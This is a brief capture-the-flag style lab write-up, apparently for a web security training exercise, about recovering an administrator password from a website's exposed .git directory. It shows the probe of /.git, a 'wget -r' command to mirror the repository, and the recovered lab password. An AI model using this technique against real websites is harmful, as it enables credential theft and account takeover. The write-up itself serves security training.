# Information disclosure in version control history

## This lab discloses sensitive information via its version control history. To solve the lab, obtain the password for the `administrator` user then log in and delete Carlos's account.

---

### step 1

https://0aab008103217307c20cd55f009d0052.web-security-academy.net/
add /.git to see git file
https://0aab008103217307c20cd55f009d0052.web-security-academy.net/.git

![screenshot](./images/lab_git_file.png)

### step2

download .git file from website

wget -r https://0aab008103217307c20cd55f009d0052.web-security-academy.net/.git/

![screenshot](./images/lab5_git_steps.png)

ADMIN_PASSWORD=3wzqgtccfg31bt4zaoiu

try admin or administrator as user name
and password: 3wzqgtccfg31bt4zaoiu
